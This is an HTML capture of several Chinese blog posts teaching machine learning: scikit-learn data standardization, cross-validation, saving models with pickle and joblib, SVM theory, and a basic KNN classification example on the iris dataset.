+<p>具体能产生多大的影响，我们可以通过datasets产生一组数据，对比直接训练和标准化之后训练的精度：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import preprocessing</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from sklearn.datasets.samples_generator import make_classification</span><br><span class="line">from sklearn.svm import SVC</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">X, y = make_classification(</span><br><span class="line">    n_samples=300, n_features=2,</span><br><span class="line">    n_redundant=0, n_informative=2,</span><br><span class="line">    n_clusters_per_class=1,scale=100)</span><br><span class="line"></span><br><span class="line">#可视化数据</span><br><span class="line">plt.scatter(X[:, 0], X[:, 1], c=y)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3)</span><br><span class="line">clf = SVC()</span><br><span class="line">clf.fit(X_train, y_train)</span><br><span class="line">print(clf.score(X_test, y_test))</span><br><span class="line"></span><br><span class="line">X = preprocessing.scale(X)</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3)</span><br><span class="line">clf = SVC()</span><br><span class="line">clf.fit(X_train, y_train)</span><br><span class="line">print(clf.score(X_test, y_test))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn09.png?raw=true" alt=""></p>
+<p>在这个程序中使用datasets中的make_classification方法产生拥有两个特征值的分类数据，然后就可以将两个特征值分别放在横轴和纵轴来观察数据分布</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn10.png?raw=true" alt=""></p>
+<p>接着对比直接训练和标准化之后训练的精度，发现前后差距非常大。</p>
+<p>标准化还有一种常用的方式那就是将特征取值规定到一个范围（默认0-1），只需将最开始代码中标准化函数改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min_max_scaler = preprocessing.MinMaxScaler()</span><br><span class="line">X_MinMax = min_max_scaler.fit_transform(x_train)</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03-交叉验证"><a href="#0x03-交叉验证" class="headerlink" title="0x03 交叉验证"></a>0x03 交叉验证</h2><p>之前在机器学习的模型评估方法里面学过几种模型验证的方法，其中也提到了，学习器训练完成后仍然在训练集种测试实际上是一种错误的方法，因为这个学习器在自身的训练集上很容易得到一个很高的分数，但是对新样本无法预测出任何有用的信息，这种情况被称为过拟合。</p>
+<p>所以为了避免这种情况，我们一般在验证的时候会将样本分为训练集和测试集，在之前的博客（ <a href="http://next.uuzdaisuki.com/2018/07/24/机器学习-5-——模型评估方法/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/07/24/机器学习-5-——模型评估方法/</a> ）介绍了留数法、交叉验证法、自助法这几种方法来分割训练集与测试集。</p>
+<p>前面的程序我们大多使用train_test_split方法将样本分为两部分，也就是留数法，那么这里就使用sklearn实现交叉验证法。</p>
+<p>交叉验证法需要用到sklearn的cross_val_score模块，我们就在刚才svm分类算法的基础上写出交叉验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import preprocessing</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from sklearn.datasets.samples_generator import make_classification</span><br><span class="line">from sklearn.svm import SVC</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from sklearn.model_selection import cross_val_score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#生成具有2种属性的300笔数据</span><br><span class="line">X, y = make_classification(</span><br><span class="line">    n_samples=300, n_features=2,</span><br><span class="line">    n_redundant=0, n_informative=2,</span><br><span class="line">    n_clusters_per_class=1,scale=100)</span><br><span class="line"></span><br><span class="line">#可视化数据</span><br><span class="line">plt.scatter(X[:, 0], X[:, 1], c=y)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">X = preprocessing.scale(X)</span><br><span class="line">clf = SVC()</span><br><span class="line"></span><br><span class="line">scores=cross_val_score(clf,X,y,cv=10,scoring=&apos;accuracy&apos;)</span><br><span class="line"></span><br><span class="line">print(scores)</span><br><span class="line">print(scores.mean())</span><br></pre></td></tr></table></figure></p>
+<p>数据分布如图：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn11.png?raw=true" alt=""></p>
+<p>输出十组分别的分数和平均分数：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn12.png?raw=true" alt=""></p>
+<p>交叉验证因为抽取的测试集更随机化且全部抽到，所以平均后的评估得分更令人信服。</p>
+<p>其中cross_val_score种的clf是模型，X样本特征，y是样本标签，cv是交叉验证的分组数量，scoring参数是计分指标，可以根据实际情况在官方文档选取合适的计分指标：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn13.png?raw=true" alt=""></p>
+<h2 id="0x04-模型保存"><a href="#0x04-模型保存" class="headerlink" title="0x04 模型保存"></a>0x04 模型保存</h2><p>在实际的机器学习运用中，训练用的样本量是十分大的，也就是说训练一个模型需要的时间开销非常大，我们要使用一个训练好的模型，每次都去重新训练一遍是不现实的，所以在训练好之后我们需要保存模型。</p>
+<p>我们常用的存取模型方法有如下两种</p>
+<h3 id="使用pickle保存模型"><a href="#使用pickle保存模型" class="headerlink" title="使用pickle保存模型"></a>使用pickle保存模型</h3><p>第一种方法是使用pickle库保存和读取模型，以上一篇博客中的k近邻算法为例：</p>
+<p>保存模型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.neighbors import KNeighborsClassifier</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line">iris_y = iris.target</span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier()</span><br><span class="line">knn.fit(iris_x,iris_y)</span><br><span class="line"></span><br><span class="line">file = open(&quot;model/knn.pickle&quot;,&quot;wb&quot;)</span><br><span class="line">pickle.dump(knn,file)</span><br></pre></td></tr></table></figure></p>
+<p>然后当前程序目录中model子目录下就会产生一个knn.pickle的文件。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn14.png?raw=true" alt=""></p>
+<p>读取模型：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line"></span><br><span class="line">file = open(&quot;model/knn.pickle&quot;,&quot;rb&quot;)</span><br><span class="line">knn=pickle.load(file)</span><br><span class="line"></span><br><span class="line">pred = knn.predict(iris_x[0:5])</span><br><span class="line">print(pred)</span><br></pre></td></tr></table></figure>
+<p>读取模型时直接读取这个文件，就可以使用现有模型，在以上代码中使用这个模型预测了前五个数据，我们都知道鸢尾花数据集前五个样本分类都是0，将它们放在这个模型中预测输出，发现也都是0。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn15.png?raw=true" alt=""></p>
+<h3 id="使用joblib保存模型"><a href="#使用joblib保存模型" class="headerlink" title="使用joblib保存模型"></a>使用joblib保存模型</h3><p>第二种方法是用sklearn的joblib模块保存，joblib库会自动多线程运行，所以在面对大数据的时候性能要优于pickle模块，但是joblib模块只能将文件保存在磁盘中，而且会产生多个文件。</p>
+<p>保存模型：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.neighbors import KNeighborsClassifier</span><br><span class="line">from sklearn.externals import joblib</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line">iris_y = iris.target</span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier()</span><br><span class="line">knn.fit(iris_x,iris_y)</span><br><span class="line"></span><br><span class="line">joblib.dump(knn,&apos;model/knn.pkl&apos;)</span><br></pre></td></tr></table></figure>
+<p>然后当前程序目录中model子目录下就会产生一个knn.pkl的文件，有时会产生多个文件，但是读取时只用读取第一个。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn16.png?raw=true" alt=""></p>
+<p>读取模型：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.externals import joblib</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">knn=joblib.load(&apos;model/knn.pkl&apos;)</span><br><span class="line"></span><br><span class="line">pred = knn.predict(iris_x[0:5])</span><br><span class="line">print(pred)</span><br></pre></td></tr></table></figure>
+<p>测试结果仍然成立。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn17.png?raw=true" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/31/机器学习-8-——支持向量机-SVM/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/07/31/机器学习-8-——支持向量机-SVM/" itemprop="url">
+                  机器学习(8)——支持向量机(SVM)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-31T10:27:12+08:00">
+                2018-07-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/机器学习/" itemprop="url" rel="index">
+                    <span itemprop="name">机器学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/07/31/机器学习-8-——支持向量机-SVM/" class="leancloud_visitors" data-flag-title="机器学习(8)——支持向量机(SVM)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-支持向量机"><a href="#0x00-支持向量机" class="headerlink" title="0x00 支持向量机"></a>0x00 支持向量机</h2><p>在机器学习中，支持向量机（support vector machine，常简称为SVM，又名支持向量网络）是在分类与回归分析中分析数据的监督式学习模型与相关的学习算法。给定一组训练实例，每个训练实例被标记为属于两个类别中的一个或另一个，SVM训练算法建立一个将新的实例分配给两个类别之一的模型，使其成为非概率二元（binary classifier）线性分类器。SVM模型是将实例表示为空间中的点，这样映射就使得单独类别的实例被尽可能宽的明显的间隔分开。然后，将新的实例映射到同一空间，并基于它们落在间隔的哪一侧来预测所属类别。</p>
+<h2 id="0x01-间隔与支持向量"><a href="#0x01-间隔与支持向量" class="headerlink" title="0x01 间隔与支持向量"></a>0x01 间隔与支持向量</h2><p>首先看一张图：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_01.png?raw=true" alt=""></p>
+<p>如果要用一条直线将两种类型的图形分开，那这样的直线我们可以找到很多条。那么哪条才是最好的分割线？</p>
+<p>我们可以设想一下，目前的样本并不代表所有可能发生的情况，如果进入新样本，很有可能会存在向直线贴近的样本，那么如果选择的直线到两边最近的点间隔越长，输入新样本时越过这条线的机会就越小，泛化能力就越强。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_05.png?raw=true" alt=""></p>
+<p>图中距离这条分割线最近的这几个点，就被称为支持向量。</p>
+<p>两个异类支持向量到这条直线的距离之和，就被称为间隔。</p>
+<p>假设我们分割线的方程如下：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_02.png?raw=true" alt=""></p>
+<p>其中w是法向量。</p>
+<p>我们的可以通过它将训练样本正确分类，即</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_03.png?raw=true" alt=""></p>
+<p>留出间隔，令：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_04.png?raw=true" alt=""></p>
+<p>则间隔的数学表示为：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_06.png?raw=true" alt=""></p>
+<p>我们为了找到最大间隔，也就是使γ最大，也就是使||w||²最小，就可以转换成找</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_07.png?raw=true" alt=""></p>
+<p>的最小值。这被称为支持向量机的基本型。</p>
+<h2 id="0x02-对偶问题"><a href="#0x02-对偶问题" class="headerlink" title="0x02 对偶问题"></a>0x02 对偶问题</h2><p>上面的问题最终转换成求支持向量机基本型的最小值问题，这是一个凸二次规划问题，可以直接求解，但是我们有更优的计算方法。那就是通过拉格朗日乘子法得到其”对偶问题“。</p>
+<p>具体做法是对每条约束都增加拉格朗日乘子αi，则该问题可以写成：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_08.png?raw=true" alt=""></p>
+<p>这个时候要求其最小值，从之前转换成最小值的模型前加了1/2这点就可以想到，我们接下来肯定要通过求导，求导数零点，找极值点来完成。</p>
+<p>所以分别对w和b求导可以得出：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_09.png?raw=true" alt=""></p>
+<p>将其结论代回L中可得对偶问题：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_10.png?raw=true" alt=""></p>
+<p>这个结果，我们就可以直接交给机器去处理数据求这个式子的最大值了。</p>
+<h2 id="0x03-核函数"><a href="#0x03-核函数" class="headerlink" title="0x03 核函数"></a>0x03 核函数</h2><p>线性可分的训练样本我们可以通过直线将其正确分类，但是如果遇到线性不可分的训练样本，或许就不能通过一条直线来进行分割。</p>
+<p>这种情况下，我们可以将样本从原本的空间映射到一个更高维度的空间，使样本在这个空间内线性可分。</p>
+<p>比如二维平面中的样本投影到三维空间中，就可以通过一个超平面线性分割两类样本了：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_11.png?raw=true" alt=""></p>
+<p>具体做法是用Φ(x)代表x映射之后的特征向量，对偶问题就变为：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_12.png?raw=true" alt=""></p>
+<p>在计算Φ(xi)的转置与Φ(xj)的矩阵乘积时，在高维会变的十分困难，所以就引入了：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_13.png?raw=true" alt=""></p>
+<p>Φ(xi)与Φ(xj)内积等于它们在原始样本空间通过k函数计算的结果，这样就不用去高维计算内积。这个k函数就被称为核函数。</p>
+<p>常用的核函数如下：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_14.png?raw=true" alt=""></p>
+<p>并不是所有的情况通过核函数映射之后都是线性可分的，我们会根据实际的情况去选取合适的核函数，使其映射到高维之后可以分割，然后高维分割的超平面在原始平面上的投影就是在原始平面上的分割曲线。</p>
+<h2 id="0x04-硬间隔和软间隔"><a href="#0x04-硬间隔和软间隔" class="headerlink" title="0x04 硬间隔和软间隔"></a>0x04 硬间隔和软间隔</h2><p>即使使用了核函数，实际中，我们仍然存在一种不可分的情况，即两类样本互相有一部分出现在对方的区域，如图：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_15.png?raw=true" alt=""></p>
+<p>那么这种情况，我们的处理方式就是允许支持向量机在一些样本上出错，也就是“软间隔”。</p>
+<p>对应的所有样本都被正确分类就被称为“硬间隔”。</p>
+<p>在之前机器学习的经验中我们都明白，出错就会有损失，那么我们需要一个损失函数来计算惩罚，最终的优化目标是在最大化间隔的同时使不满足约束的样本尽可能少，可写为：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_16.png?raw=true" alt=""></p>
+<p>这里面使用的损失函数是0/1损失函数：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_17.png?raw=true" alt=""></p>
+<p>我们也有其他几种替代损失函数可供选择：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_18.png?raw=true" alt=""></p>
+<p>在软间隔情况中，只使满足最终优化目标的值优化到最小即可。</p>
+<h2 id="0x05-支持向量机的优缺点"><a href="#0x05-支持向量机的优缺点" class="headerlink" title="0x05 支持向量机的优缺点"></a>0x05 支持向量机的优缺点</h2><p>支持向量机的优势在于:</p>
+<ul>
+<li><p>在高维空间中非常高效</p>
+</li>
+<li><p>即使在数据维度比样本数量大的情况下仍然有效</p>
+</li>
+<li><p>在决策函数（称为支持向量）中使用训练集的子集,因此它也是高效利用内存的</p>
+</li>
+<li><p>通用性: 不同的核函数 核函数与特定的决策函数一一对应，常见的kernel已<br>经提供,也可以指定定制的内核</p>
+</li>
+</ul>
+<p>支持向量机的缺点包括:</p>
+<ul>
+<li><p>如果特征数量比样本数量大得多,在选择核函数 核函数 时要避免过拟合,<br>而且正则化项是非常重要的</p>
+</li>
+<li><p>支持向量机不直接提供概率估计</p>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/30/python-scikit-learn学习-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/07/30/python-scikit-learn学习-1/" itemprop="url">
+                  python-scikit learn学习(1)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-30T16:18:08+08:00">
+                2018-07-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/机器学习/" itemprop="url" rel="index">
+                    <span itemprop="name">机器学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/07/30/python-scikit-learn学习-1/" class="leancloud_visitors" data-flag-title="python-scikit learn学习(1)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-scikit-learn"><a href="#0x00-scikit-learn" class="headerlink" title="0x00 scikit-learn"></a>0x00 scikit-learn</h2><p>Scikit-learn（以前称为scikits.learn）是一个用于Python编程语言的免费开源机器学习库。它广泛地支持各种分类、聚类以及回归分析方法比如支持向量机、随机森林、DBSCAN等等，由于其强大的功能、优异的拓展性以及易用性，目前受到了很多数据科学从业者的欢迎，也是业界相当著名的一个开源项目之一。</p>
+<h2 id="0x01-scikit-learn安装"><a href="#0x01-scikit-learn安装" class="headerlink" title="0x01 scikit-learn安装"></a>0x01 scikit-learn安装</h2><p>scikit-learn安装和别的python安装没有多少不同，不过安装scikit-learn之前要先安装新版本的numpy和scipy库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install numpy</span><br><span class="line">pip install scipy</span><br><span class="line">pip install scikit-learn</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-scikit-learn数据集"><a href="#0x02-scikit-learn数据集" class="headerlink" title="0x02 scikit-learn数据集"></a>0x02 scikit-learn数据集</h2><p>scikit-learn库中有一些标准数据集。在scikit-learn官网的数据库中有大量的数据集，可以直接拿来使用。</p>
+<p>官方数据集： <a href="http://scikit-learn.org/stable/modules/classes.html#module-sklearn.datasets" target="_blank" rel="noopener">http://scikit-learn.org/stable/modules/classes.html#module-sklearn.datasets</a></p>
+<p>其中Loaders都是现实中一些整理好的数据，可以直接使用。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn01.png?raw=true" alt=""></p>
+<p>Samples generator中是一些用户可以通过输入参数来控制随机生成的数据。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn02.png?raw=true" alt=""></p>
+<p>使用时我们要先导入sklearn.datasets库，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">iris = datasets.load_iris() #鸢尾花数据集</span><br><span class="line">print(iris)</span><br><span class="line">digits = datasets.load_digits() #数字数据集</span><br><span class="line">print(digits)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>一个数据集是一个包含数据所有元素的类字典对象，这个数据存在‘.data’成员变量中，是一个n*n数组行表示样例，列表示特征。</li>
+<li>在监督学习中，一个或多个标签Y存储在‘.target’成员变量中。</li>
+</ul>
+<p>从如下代码运行结果就能看出这几部分数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">digits = datasets.load_digits() #数字数据集</span><br><span class="line">print(digits.data)</span><br><span class="line">print(digits.target)</span><br><span class="line">print(digits.images[0])</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-scikit-learn学习方法选择"><a href="#0x03-scikit-learn学习方法选择" class="headerlink" title="0x03 scikit-learn学习方法选择"></a>0x03 scikit-learn学习方法选择</h2><p>在学习和预测之前，我们要根据我们的数字数据集以及要达成的目标选择合适的机器学习方法，scikit-learn官网有一张图清晰的给出了如何去选择正确的方法：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn03.png?raw=true" alt=""></p>
+<p>官方网站提供的原图地址： <a href="http://scikit-learn.org/stable/tutorial/machine_learning_map/index.html" target="_blank" rel="noopener">http://scikit-learn.org/stable/tutorial/machine_learning_map/index.html</a></p>
+<p>我介绍一下具体步骤：</p>
+<ul>
+<li><p>这张图从start部分开始读，如果数据少于50，就去获取更多数据，如果数据大于50，就进入下一步。</p>
+</li>
+<li><p>然后根据是否预测类别、有无标签、是否预测数量等判断分别属于分类问题、聚类问题、回归问题和降维问题四种中的哪一种。</p>
+</li>
+<li><p>再根据数据量、数据类型等来分别选择合适的机器学习算法。</p>
+</li>
+</ul>
+<p>在选择好方法之后，从scikit-learn库导入对应的方法，然后根据官方提供的使用方法进行调用和参数的选用，就可以进行学习。</p>
+<h2 id="0x04-scikit-learn学习与预测（分类问题）"><a href="#0x04-scikit-learn学习与预测（分类问题）" class="headerlink" title="0x04 scikit-learn学习与预测（分类问题）"></a>0x04 scikit-learn学习与预测（分类问题）</h2><p>在这里以鸢尾花数据集的学习和预测为例，讲解一下通用的scikit-learn学习与预测步骤，先贴代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import numpy</span><br><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from sklearn.neighbors import KNeighborsClassifier</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line">iris_y = iris.target</span><br><span class="line">#print(iris_y)</span><br><span class="line"></span><br><span class="line">x_trian,x_test,y_train,y_test = train_test_split(iris_x,iris_y,test_size=0.25)</span><br><span class="line"></span><br><span class="line">#print(y_train)</span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier()</span><br><span class="line">knn.fit(x_trian,y_train)</span><br><span class="line">y_predict = knn.predict(x_test)</span><br><span class="line"></span><br><span class="line">print(y_predict)</span><br><span class="line">pritn(y_test)</span><br></pre></td></tr></table></figure>
+<ul>
